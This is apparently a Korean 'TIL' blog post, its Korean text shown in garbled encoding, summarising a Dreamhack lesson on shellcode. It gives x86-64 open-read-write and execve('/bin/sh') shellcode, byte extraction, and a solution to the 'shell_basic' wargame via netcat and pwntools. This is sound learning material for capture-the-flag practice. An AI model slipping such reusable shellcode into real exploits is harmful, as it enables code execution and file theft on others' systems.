---
title:  "TIL : Shellcode ğŸš"
excerpt: "2022.07.18 TIL âœ"
toc: true
toc_sticky: true

categories:
  - TIL
  - Hacking

---

https://dreamhack.io/lecture/courses/50

**Shellcode**ëŠ” exploitì„ ìœ„í•´ ì œì‘ëœ assembly code ì¡°ê°ì„ ë§í•œë‹¤.

ë§Œì•½ ripë¥¼ ìì‹ ì´ ì‘ì„±í•œ shellcodeë¡œ ì˜®ê¸¸ ìˆ˜ ìˆë‹¤ë©´, ì‚¬ì‹¤ìƒ ì›í•˜ëŠ” ëª¨ë“  ëª…ë ¹ì„ CPUì— ë‚´ë¦´ ìˆ˜ ìˆê²Œ ëœë‹¤.

## orw shellcode

### ì˜ì‚¬ ì½”ë“œ
    
```
char buf[0x30];

int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30);
write(1, buf, 0x30);
```
    
### syscall
    
| syscall | rax | arg0Â (rdi) | arg1Â (rsi) | arg2Â (rdx) |
| --- | --- | --- | --- | --- |
| read | 0x00 | unsigned int fd | char *buf | size_t count |
| write | 0x01 | unsigned int fd | const char *buf | size_t count |
| open | 0x02 | const char *filename | int flags | umode_t mode |
    
### assemly

```c
;Name: orw.S
push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)
mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)
mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

â€œ/tmp/flagâ€ë¥¼ ë„£ì„ ë•Œ **little endian**ì„ ê³ ë ¤í•´ì•¼ í•˜ê³ , **8ê¸€ìì”© ë’¤ì§‘íŒë‹¤ëŠ”** ì‚¬ì‹¤ì„ ë†“ì¹˜ì§€ ë§ì.

`â€œalf/pmt/â€` â†’ `0x616c662f706d742f`

`â€œgâ€` â†’ `0x67`

    
### skeleton code for compiling

```c
__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    "Input your shellcode here.\n"
    "Each line of your shellcode should be\n"
    "seperated by '\n'\n"
    "xor rdi, rdi   # rdi = 0\n"
    "mov rax, 0x3c	# rax = sys_exit\n"
    "syscall        # exit(0)");
void run_sh();
int main() { run_sh(); }
```

assemblyë¥¼ skeleton codeì— ë„£ì€ ë’¤ ì‹¤í–‰í•˜ë©´, ì…¸ì½”ë“œê°€ ì‹¤í–‰ë˜ì–´ /tmp/flagì— ì €ì¥ëœ ë¬¸ìì—´ì´ ì¶œë ¥ëœë‹¤.
    
## execve shellcode

execve shellcodeëŠ” shell programì„ ì‹¤í–‰í•˜ëŠ” shellcodeì´ë‹¤.
    
### ì˜ì‚¬ ì½”ë“œ

```c
execve("/bin/sh", null, null);
```

### syscall

| syscall | rax | arg0Â (rdi) | arg1Â (rsi) | arg2Â (rdx) |
| --- | --- | --- | --- | --- |
| execve | 0x3b | const char *filename | const char *const *argv | const char *const *envp |

### assembly

```c
`;Name: execve.S
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp  ; rdi = "/bin/sh\x00"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)
```

ìœ„ì˜ ìŠ¤ì¼ˆë ˆí†¤ ì½”ë“œì— assemblyë¥¼ ë„£ê³  ì‹¤í–‰í•˜ë©´, `/bin/sh`ê°€ ì‹¤í–‰ëœë‹¤.
    
## objdumpë¥¼ ì´ìš©í•œ shellcode ì¶”ì¶œ

```c
$ sudo apt-get install nasm 
$ nasm -f elf shellcode.asm //assemble shellcode.asm
$ objdump -d shellcode.o //disassemble shellcode.o
shellcode.o:     file format elf32-i386
Disassembly of section .text:
00000000 <_start>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 2f 2f 73 68       	push   $0x68732f2f
   8:	68 2f 62 69 6e       	push   $0x6e69622f
   d:	89 e3                	mov    %esp,%ebx
   f:	31 c9                	xor    %ecx,%ecx
  11:	31 d2                	xor    %edx,%edx
  13:	b0 0b                	mov    $0xb,%al
  15:	cd 80                	int    $0x80
$
```

```c
$ objcopy --dump-section .text=shellcode.bin shellcode.o
$ xxd shellcode.bin
00000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e331  1.Ph//shh/bin..1
00000010: c931 d2b0 0bcd 80                        .1.....
$ 
execve /bin/sh shellcode: 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```
    
## Wargame: [shell_basic](https://dreamhack.io/wargame/challenges/410/)
    
ì£¼ì–´ì§„ í”„ë¡œê·¸ë¨ì€ ì…ë ¥í•œ shellcodeë¥¼ ì‹¤í–‰í•œë‹¤.
    
`/home/shell_basic/flag_name_is_loooooong`ì— ìˆëŠ” flagë¥¼ êµ¬í•˜ë©´ ëœë‹¤.
    
### Solution 1 - ì§ì ‘ assembly ì‘ì„±í•˜ê¸°

1. **orw shellcode**ë¥¼ ì‘ì„±í•œë‹¤.
            
	ì´ë•Œ `/home/shell_basic/flag_name_is_loooooong`ì„ 8ìì”© ëŠì–´ì„œ stackì— ë„£ì–´ì¤˜ì•¼í•¨ì— ì£¼ì˜í•œë‹¤.
            
	`gnoooooo` â†’ `0x676e6f6f6f6f6f6f`
            
	â€¦
            
	`hs/emoh/` â†’ `0x68732f656d6f682f`

	```c
    section .text
    global _start
    _start:
    push 0
    mov rax, 0x676e6f6f6f6f6f6f
    push rax
    mov rax, 0x6c5f73695f656d61
    push rax
    mov rax, 0x6e5f67616c662f63
    push rax
    mov rax, 0x697361625f6c6c65
    push rax
    mov rax, 0x68732f656d6f682f
    push rax
    mov rdi, rsp
    mov rax, 0x02
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rdi, rax
    mov rax, 0
    mov rsi, rsp
    sub rsi, 0x30
    mov rdx, 0x30
    syscall

    mov rdi, 1
    mov rax, 1
    syscall
    ```

2. shellcodeë¥¼ binary í˜•íƒœë¡œ ë³€í™˜í•œë‹¤.

    ```c
    $ nasm -f elf64 test.asm
    $ objcopy --dump-section .text=test.bin test.o
    ```

3. ë³€í™˜í•œ binaryë¥¼ ë¬¸ì œì—ì„œ ì£¼ì–´ì§„ ì£¼ì†Œë¡œ ì „ì†¡í•œë‹¤.

    ```c
    $ cat test.bin | nc host3.dreamhack.games 12345
    ```

### Solution 2 - pwntool í™œìš©í•˜ê¸°

```python
from pwn import *
r = remote('host3.dreamhack.games', 12345)
context.arch = 'amd64'

sh = shellcraft.amd64.open('/home/shell_basic/flag_name_is_loooooong')
sh += "sub rsp, 100\n"
sh += shellcraft.amd64.read('rax', 'rsp', 100)
sh += shellcraft.amd64.write(1, 'rsp', 100)
# print("sh:", sh)
mc = asm(sh)
r.send(mc)
r.interactive()
```